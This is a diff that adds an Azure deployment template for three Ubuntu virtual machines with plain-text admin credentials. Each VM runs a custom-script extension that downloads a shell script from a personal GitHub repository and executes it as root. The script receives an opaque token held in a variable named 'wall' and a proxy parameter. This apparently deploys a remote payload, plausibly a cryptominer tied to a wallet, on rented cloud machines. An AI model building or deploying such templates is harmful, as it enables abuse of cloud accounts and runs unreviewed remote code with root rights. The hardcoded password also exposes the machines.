@@ -1,0 +1,133 @@
+{
+  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+  "contentVersion": "1.0.0.0",
+  "parameters": {
+    "lokasi": {
+        "type": "string"
+      },
+    "prox": {
+      "type": "string"
+    }
+  },
+  "variables": {
+    "vmnama": "xrvzx",
+    "namaext": "CustomScript",
+    "wall": "RVFP2RM1sJq812KupKtkF",
+    "subnet1Name": "subnet",
+    "nicName1": "[concat('nic', variables('vmnama'))]",
+    "vnn": "[concat('net', variables('vmnama'))]"
+  },
+  "resources": [
+    {
+      "apiVersion": "2017-03-01",
+      "type": "Microsoft.Network/virtualNetworks",
+      "name": "[variables('vnn')]",
+      "location": "[parameters('lokasi')]",
+      "properties": {
+        "addressSpace": {
+          "addressPrefixes": ["10.0.0.0/16"]
+        },
+        "subnets": [
+          {
+            "name": "[variables('subnet1Name')]",
+            "properties": {
+              "addressPrefix": "10.0.0.0/24"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "apiVersion": "2017-03-01",
+      "type": "Microsoft.Network/networkInterfaces",
+      "name": "[concat(variables('nicName1'),copyIndex())]",
+      "location": "[parameters('lokasi')]",
+      "copy": {
+        "name": "nicLoop",
+        "count": 3
+      },
+      "dependsOn": [
+        "[concat('Microsoft.Network/virtualNetworks/', variables('vnn'))]"
+      ],
+      "properties": {
+        "ipConfigurations": [
+          {
+            "name": "ipconfig1",
+            "properties": {
+              "privateIPAllocationMethod": "Dynamic",
+              "subnet": {
+                "id": "[resourceId('Microsoft.Network/virtualNetworks/subnets/', variables('vnn'), variables('subnet1Name'))]"
+              }
+            }
+          }
+        ]
+      }
+    },
+    {
+      "apiVersion": "2016-04-30-preview",
+      "type": "Microsoft.Compute/virtualMachines",
+      "name": "[concat(variables('vmnama'),copyIndex())]",
+      "location": "[parameters('lokasi')]",
+      "copy": {
+        "name": "vmLoop",
+        "count": 3
+      },
+      "dependsOn": [
+        "[concat('Microsoft.Network/networkInterfaces/', variables('nicName1'), copyIndex())]"
+      ],
+      "properties": {
+        "hardwareProfile": {
+          "vmSize": "Standard_DS2_v2"
+        },
+        "osProfile": {
+          "computerName": "[concat(variables('vmnama'),copyIndex())]",
+          "adminUsername": "raviz",
+          "adminPassword": "NgapainSihDek!"
+        },
+        "storageProfile": {
+          "osDisk": {
+            "createOption": "FromImage"
+          },
+          "imageReference": {
+            "publisher": "canonical",
+            "offer": "0001-com-ubuntu-server-focal",
+            "sku": "20_04-lts-gen2",
+            "version": "latest"
+          }
+        },
+        "networkProfile": {
+          "networkInterfaces": [
+            {
+              "id": "[resourceId('Microsoft.Network/networkInterfaces', concat(variables('nicName1'),copyIndex()))]"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "type": "Microsoft.Compute/virtualMachines/extensions",
+      "name": "[concat(variables('vmnama'),copyIndex(),'/', variables('namaext'))]",
+      "apiVersion": "2016-04-30-preview",
+      "location": "[parameters('lokasi')]",
+      "copy": {
+        "name": "extensionLoop",
+        "count": 3
+      },
+      "dependsOn": [
+        "[concat('Microsoft.Compute/virtualMachines/', variables('vmnama'), copyIndex())]"
+      ],
+      "properties": {
+        "publisher": "Microsoft.Azure.Extensions",
+        "type": "CustomScript",
+        "typeHandlerVersion": "2.0",
+        "autoUpgradeMinorVersion": true,
+        "settings": {
+          "fileUris": ["https://github.com/raviz00/x/raw/main/a.sh"]
+        },
+        "protectedSettings": {
+          "commandToExecute": "[concat('sudo sh a.sh ',variables('wall'), ' ', parameters('prox'))]"
+        }
+      }
+    }
+  ]
+}
